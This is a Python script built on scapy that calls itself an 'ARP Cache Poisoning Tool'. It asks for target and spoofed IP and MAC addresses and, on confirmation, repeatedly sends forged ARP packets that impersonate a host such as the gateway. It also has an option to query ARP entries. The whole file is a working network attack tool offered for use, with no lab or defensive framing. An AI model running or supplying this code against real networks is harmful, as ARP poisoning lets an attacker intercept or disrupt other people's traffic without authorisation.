import argparse
import socket
from scapy.all import ARP, Ether, sendp, srp, get_if_addr

def arp_poison(target_ip, target_mac, spoof_ip, spoof_mac):
    # craft the ARP request packet
    arp_request = ARP(op=1, psrc=spoof_ip, pdst=target_ip, hwsrc = spoof_mac)
    
    # craft the Ethernet frame
    ether_frame = Ether(dst=target_mac, src= spoof_mac)
    
    # combine the Ethernet frame and ARP request packet
    packet = ether_frame / arp_request
    
    # send the packet
    sendp(packet)
    packet.show()


def display_arp_cache(target_ip):
    try:
        result, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip), timeout=2, verbose=0)
        result.show()
    except Exception as e:
        print(f"Unable to retrieve ARP cache for {target_ip}. Error: {e}")


def input_attributes():
    target_ip = input("Enter the target IP address: ")
    target_mac = input("Enter the target MAC address: ")
    spoof_ip = input("Enter the IP address to spoof (e.g., gateway): ")
    spoof_mac = input("Enter the MAC address corresponding to the spoofed IP: ")
    
    return target_ip, target_mac, spoof_ip, spoof_mac

def main():
    parser = argparse.ArgumentParser(description="ARP Cache Poisoning Tool")
    
    # command-line options
    parser.add_argument("-c", "--check-cache", action="store_true", help="Check the ARP cache table and exit.")
    parser.add_argument("-a", "--arp-poisoning-attack", action="store_true", help="Perform ARP poisoning attack.")
    args = parser.parse_args()

    if args.check_cache:
        target_ip = input("Enter the target IP address to check ARP cache: ")
        display_arp_cache(target_ip)
        return

    target_ip, target_mac, spoof_ip, spoof_mac = input_attributes()

    print("\nSummary:")
    print(f"Target IP: {target_ip}\tTarget MAC: {target_mac}")
    print(f"Spoof IP: {spoof_ip}\tSpoof MAC: {spoof_mac}")

    if args.arp_poisoning_attack:
        deploy_attack = input("\nDo you want to deploy the ARP poisoning attack? (yes/no): ").lower()

        if deploy_attack == "yes":
            sent_again = "yes"
            try:
                print("ARP poisoning started. Press Ctrl+C to stop.")
                while sent_again == "yes":
                    arp_poison(target_ip, target_mac, spoof_ip, spoof_mac)
                    sent_again = input("\nDo you want to sent another  ARP poisoning packet? (yes/no): ").lower()
            except KeyboardInterrupt:
                print("\nARP poisoning stopped.")
        else:
            print("ARP poisoning not deployed.")
            return

if __name__ == "__main__":
    main()
